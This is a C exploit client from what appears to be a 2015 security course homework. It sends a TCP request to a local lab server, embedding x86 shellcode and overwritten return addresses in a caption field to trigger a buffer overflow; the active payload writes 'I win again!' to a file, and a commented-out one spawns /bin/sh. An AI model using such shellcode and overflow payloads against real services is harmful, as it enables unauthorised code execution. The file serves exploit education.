/* file: client1.c class: 18-732, Spring 2015, assignment: Homework 1
*/

/* Obligatory includes */
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>
#include <sys/time.h>
#include <errno.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/uio.h>
#include <stdarg.h>
#include <errno.h>


int main(int argc, char** argv)
{	
//	char reqstring[1000] = "IMG:abcd.jpg;LAT:57.64911;LON:10.40744;CAP:Good morning!AAAA\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x2e\x74\x78\x74\x68\x6f\x62\x61\x72\x68\x3e\x20\x66\x6f\x68\x69\x6e\x21\x20\x68\x20\x61\x67\x61\x68\x20\x77\x69\x6e\x68\x68\x6f\x20\x49\x66\x68\x65\x63\x89\xe6\x83\xec\x01\x88\x04\x24\x66\x68\x2d\x63\x83\xec\x01\x88\x04\x24\x68\x74\x72\x69\x62\x68\x2e\x64\x69\x73\x68\x6e\x2f\x73\x68\x66\x68\x62\x69\x83\xec\x01\xc6\x04\x24\x2f\x50\x56\x83\xee\x03\x56\x83\xee\x10\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80";
char reqstring[1000] = "IMG:abcd.jpg;LAT:57.64911;LON:10.40744;CAP:Good morning!AAAA\xeb\x27\x31\xd2\x31\xc9\x31\xc0\x66\xba\x24\x01\xb1\x42\x5b\x83\x6b\x0a\x01\xb0\x05\xcd\x80\x31\xd2\x31\xc9\xb2\x0c\x80\xc3\x0b\x89\xd9\x89\xc3\xb0\x04\xcd\x80\xc3\xe8\xd4\xff\xff\xff\x66\x6f\x6f\x62\x61\x72\x2e\x74\x78\x74\x01\x49\x20\x77\x69\x6e\x20\x61\x67\x61\x69\x6e\x21";
	int injectlen = 0;
	while(injectlen<=804){
		if(reqstring[injectlen] == 0){
			reqstring[injectlen]='G';		
		}	
		injectlen++;
	}
	//strcpy(&reqstring[805],"\xe0\xaf\x04\x08;");
	strcpy(&reqstring[796],"\xe9\x1b\xfd\xff\xff\xeb\xf9\xff\xff\xf9\x99\x04\x08\xf9\x99\x04\x08");
	//strcpy(&reqstring[805],"\xf8\x99\x04\x08");

	int PORTNUM;
	char SERVER_IP[16];

	int sock, nbytes, i, total, s;
	char request[1000];
	char recvline[1000];
	struct sockaddr_in srv;

	/* Set up some defaults for if you don't enter any parameters */ 
	PORTNUM = 18732;
	strcpy(SERVER_IP, "127.0.0.1");	

	printf("\nUsage: client [-port <port_number>] [-server <server_IP>]\n");
        
	/* Process command line switches */
	/* Usage: client [-port <port_number>] [-server <server_IP>] */
	for(i = 1; i < argc; i++){
		if(argv[i][0] == '-'){
			if(strcmp(argv[i], "-port") == 0){
				PORTNUM = atoi(argv[++i]);
			}else if(strcmp(argv[i], "-server") == 0){
				strncpy(SERVER_IP, argv[++i],16);
	
            }else{
				printf("Unknown switch \"%s\"\n", argv[i]);
				exit(1);
			}
		}else{
			printf("Unknown switch \"%s\"\n", argv[i]);
			exit(1);
		}
	}

	/* Fill in the server data structure */
	memset(&srv, 0, sizeof(srv));
	srv.sin_family = AF_INET;
	srv.sin_port = htons(PORTNUM);
	srv.sin_addr.s_addr = inet_addr(SERVER_IP);

	/* Create the socket */
	if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0){
		perror("socket");
		exit(1);
	}

	printf("\nConnecting to %s:%u\n", SERVER_IP, PORTNUM);

	/* Connect to the socket */
	if(connect(sock, (struct sockaddr*) &srv, sizeof(srv)) < 0){
		perror("connect");
		exit(1);
	}

	printf("The request is:\n%s\n", reqstring); 

	/* Make the request */
	strncpy(request, reqstring,1000 ); 
	total = 0;
	s = strlen(request);
	while( total < s){
		nbytes = write(sock, request + total, s);
		total = total + nbytes;
	} 

	printf("The response of the server is:\n");	

	/* Get and output the response */
	nbytes = 0;
	while( (nbytes = read(sock, recvline, 1000)) > 0){
		recvline[nbytes] = 0;
		printf("%s\n", recvline); 
	}


	return(0);
}

